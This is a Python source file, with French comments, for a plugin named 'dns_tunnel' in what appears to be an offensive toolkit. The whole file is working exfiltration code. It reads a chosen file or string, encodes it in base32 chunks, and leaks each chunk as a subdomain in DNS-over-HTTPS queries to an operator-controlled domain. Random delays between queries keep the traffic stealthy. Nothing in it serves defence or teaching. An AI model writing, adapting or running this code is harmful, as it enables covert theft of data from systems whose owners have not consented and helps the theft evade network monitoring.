import asyncio
import base64
import random
import time
import httpx
from bxp_secretsonar.plugins.plugin_loader import PayloadPlugin
from bxp_secretsonar.core.models_v2 import PluginMeta, PluginType

class DNSTunnel(PayloadPlugin):
    meta = PluginMeta(
        name="dns_tunnel",
        version="1.0",
        author="Phantom-BXP",
        description="Exfiltration de données via DNS over HTTPS (DoH) – unidirectionnel, furtif",
        plugin_type=PluginType.PAYLOAD,
        protocols=["dns"]
    )

    async def run(self, target, options: dict):
        """
        target : domaine contrôlé par l'opérateur (ex: tunnel.mondomaine.com)
        options:
          - data : données à exfiltrer (chaîne ou bytes)
          - file : chemin d'un fichier à exfiltrer
          - doh_endpoint : URL du resolver DoH (défaut: Cloudflare)
          - chunk_size : taille des chunks (défaut: 30)
          - min_delay / max_delay : délai entre les requêtes
        """
        domain = target if target else options.get("domain", "tunnel.local")
        data = options.get("data")
        filepath = options.get("file")
        doh_endpoint = options.get("doh_endpoint", "https://cloudflare-dns.com/dns-query")
        chunk_size = int(options.get("chunk_size", 30))
        min_delay = float(options.get("min_delay", 30))
        max_delay = float(options.get("max_delay", 120))

        # Récupérer les données
        if filepath:
            try:
                with open(filepath, "rb") as f:
                    payload = f.read()
            except Exception as e:
                return {"success": False, "output": str(e)}
        elif data:
            payload = data.encode() if isinstance(data, str) else data
        else:
            return {"success": False, "output": "Aucune donnée à exfiltrer (--data ou --file requis)"}

        # Découpage en chunks encodés base32 (plus discret que base64)
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        total = len(chunks)
        success = 0

        async with httpx.AsyncClient(timeout=10.0) as client:
            for i, chunk in enumerate(chunks):
                encoded = base64.b32encode(chunk).decode().rstrip("=").lower()
                subdomain = f"{encoded}.{i:04d}.{domain}"
                url = f"{doh_endpoint}?name={subdomain}&type=TXT"

                try:
                    resp = await client.get(url, headers={"Accept": "application/dns-json"})
                    if resp.status_code == 200:
                        success += 1
                except Exception:
                    pass

                # Délai aléatoire entre les chunks
                delay = random.uniform(min_delay, max_delay)
                await asyncio.sleep(delay)

                # Log de progression (optionnel)
                if (i+1) % 10 == 0:
                    print(f"[DNS Tunnel] Progression : {i+1}/{total} chunks envoyés")

        return {
            "success": success == total,
            "output": f"Exfiltration terminée : {success}/{total} chunks envoyés vers {domain}"
        }
